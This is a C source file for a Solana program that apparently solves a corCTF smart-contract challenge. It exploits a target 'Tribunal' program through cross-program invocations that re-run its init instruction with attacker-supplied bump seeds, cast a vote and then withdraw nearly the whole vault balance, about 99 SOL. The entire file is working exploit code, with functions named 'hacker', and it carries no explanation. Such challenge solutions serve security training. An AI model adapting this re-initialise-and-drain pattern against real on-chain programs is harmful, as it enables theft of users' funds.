#include <solana_sdk.h>

#define CORCTF_USER      0
#define CORCTF_CONFIG    1
#define CORCTF_VAULT     2
#define CORCTF_TARGET    3
#define CORCTF_FVAULT    4
#define CORCTF_PROPOSE   5
#define CORCTF_SYSTEM    6
#define CORCTF_TOTAL_ACC 7

#define CORCTF_CONFIG_BUMPSEED  0
#define CORCTF_VAULT_BUMPSEED   1
#define CORCTF_PROPOSE_BUMPSEED 2


uint64_t init(SolParameters *params)
{
  sol_log("[+] About to init !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CORCTF_USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[CORCTF_CONFIG].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_FVAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_SYSTEM].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[1 + 2] = {0};
  buf[0] = 0;
  buf[1] = params->data[CORCTF_CONFIG_BUMPSEED];
  buf[2] = params->data[CORCTF_VAULT_BUMPSEED];

  const SolInstruction instruction = {params->ka[CORCTF_TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  sol_invoke(&instruction, params->ka, params->ka_num);

  sol_log("[+] finished init !");
  return SUCCESS;
}

uint64_t vote(SolParameters *params)
{
  sol_log("[+] About to vote !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CORCTF_USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[CORCTF_CONFIG].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_FVAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_PROPOSE].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_SYSTEM].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[1 + 1 + 8] = {0};
  buf[0] = 2;
  buf[1] = 1;
  uint64_t *p = (uint64_t *)((uint8_t *)buf + 2);
  *p = 1;

  const SolInstruction instruction = {params->ka[CORCTF_TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  sol_invoke(&instruction, params->ka, params->ka_num);

  sol_log("[+] finished vote !");
  return SUCCESS;
}

uint64_t withdraw(SolParameters *params)
{
  sol_log("[+] About to withdraw !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CORCTF_USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[CORCTF_CONFIG].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[CORCTF_VAULT].key, .is_writable = true, .is_signer = false},
  };

  uint8_t buf[1 + 8] = {0};
  buf[0] = 3; // TribunalInstruction::Withdraw{amount: 99000000000 - 100}; 0x170cdc1d9c
  uint64_t *p = (uint64_t *)((uint8_t *)buf + 1);
  *p = 0x170cdc1d9c;

  const SolInstruction instruction = {params->ka[CORCTF_TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  sol_invoke(&instruction, params->ka, params->ka_num);

  sol_log("[+] finished withdraw !");
  return SUCCESS;
}

uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == CORCTF_TOTAL_ACC);
  
  sol_log("[+] Hacker 1");
  init(params);
  sol_log("[+] Hacker 2");
  vote(params);
  sol_log("[+] Hacker 3");
  withdraw(params);
  sol_log("[+] Hacker 4");
  return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input)
{
  sol_log("[+] Hacker start");

  SolAccountInfo accounts[CORCTF_TOTAL_ACC];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts)))
  {
    return ERROR_INVALID_ARGUMENT;
  }

  return hacker(&params);
}